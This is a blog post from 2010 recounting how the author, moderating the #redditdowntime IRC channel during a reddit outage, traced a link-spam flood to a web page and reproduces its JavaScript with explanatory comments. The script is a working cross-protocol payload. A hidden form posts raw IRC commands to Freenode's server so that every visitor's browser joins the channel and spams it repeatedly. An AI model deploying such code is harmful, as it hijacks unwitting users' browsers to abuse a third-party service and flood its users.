--- 
layout: post
title: "Using a browser to piss off IRC users, or, spamming #redditdowntime"
tags: 
- Miscellaneous
- Software Development
created: 1264585384
---
One of my most favorite sites on the internet, <a id="aptureLink_oItUAC4mad" href="http://www.crunchbase.com/company/reddit">reddit</a>, took [some downtime](http://www.reddit.com/r/announcements/comments/au8tj/reddit_will_be_down_for_maintenance_for_about_two/) this evening while doing some infrastructure (both hardware and software) upgrades. On their down-page, the reddit team invited everybody to join the `#redditdowntime` channel on the <a id="aptureLink_JieW5a5FB1" href="http://twitter.com/freenodestaff">Freenode</a> network, ostensibly to help users pass the time waiting for their pics and <a id="aptureLink_SYNJDA40tz" href="http://www.reddit.com/r/IAmA/">IAMAs</a> to come back online.

Shortly after reddit started their scheduled outage, I joined the channel to pass the time while I debated what I should do with my evening. Within minutes the channel was **flooded** with a number of users, varying between spouting reddit memes in caps. link-spamming or engaging in casual chit-chat. I complained to one of the ops and fairly well-known-to-redditors employee: <a id="aptureLink_dwt02hKbCy" href="http://twitter.com/jedberg">jedberg</a> about the lack of moderation and he nearly instantly gave me `+o` (ops) in the channel. Not one to take my ops duty lightly, I started kicking spammers, warning habitual caps-lock users and tried to keep things generally civil through the deluge of messages consuming the channel. 

Towards the end of the scheduled outage, some automated link-spamming started to appear and once it started it triggered more and more link-spamming. Clearly whatever was behind the <a id="aptureLink_YZZe6EYEsL" href="http://www.crunchbase.com/company/bit-ly">bit.ly</a> link was responsible for the self-propagating nature of the spamming. While the other moderators and myself tried to keep up with banning people I used wget to fetch the destination of the clearly malicious bit.ly URL to determine what we were dealing with. What I found is one of the more clever bits of JavaScript I think I've seen in recent months.

After bringing the site back up for a few minutes, reddit had to take it back down after noticing some problems with the upgrade, so another flood of users filled into the `#redditdowntime` channel and the link-spamming got worse. The most interesting aspect of the JavaScript in the code snippet below is how simple it is, I've commented it up a bit to help explain what's actually going on:

<code type="javascript">
<iframe id="y" name="y" style="display:none"></iframe>

<form method="post" target="y" action="http://irc.freenode.net:6667/" enctype="text/plain" id="f" style="display:none">
    <textarea name="x" id="x"></textarea>
</form>

<script type="text/javascript">
    /* 
     * Generate a random string of characters to use for an IRC nick
     */
    function rnd(){
        var chars="abcdefghijklmnopqrstuvwxyz";
        var r='';
        var length=Math.floor(Math.random()*10+3);
        for (var i=0;i<length;i++){
            var rnum=Math.floor(Math.random() * chars.length);
            r += chars.substring(rnum, rnum+1);
        }
        return r;
    }
    function lol(){
        /* Grab a reference to the textarea */
        var x = document.getElementById('x');
        /* Grab a reference to the form itself */
        var f = document.getElementById('f');
        /* Generate a fake user-name */
        var i = rnd();
        /* Generate a fake nick */
        var n = rnd();

        /* 
         * Build a series of IRC commands into a string:
         *   - Set the username
         *   - Set the nick 
         *   - Join the channel to spam (#redditdowntime)
         *   - Queue up a bunch of PRIVMSG commands to the channel with the spam link
         */
        x.value='\r\nUSER '+i+' 8 * :'+n+'\r\nNICK '+n+'\r\nJOIN #redditdowntime\r\n'+new Array(99).join('PRIVMSG #redditdowntime :http://bit.ly/lolreddit\r\n')+'';

        /* Submit the form, effectively sending the textarea contents to an IRC server */
        f.submit();

        /* Setup a loop for maximum irritation */
        setTimeout(lol, 5000);
    }
    lol();
</script>
<h1>DIGG ROOLZ! REDDIT DROOLZ!</h1></code>
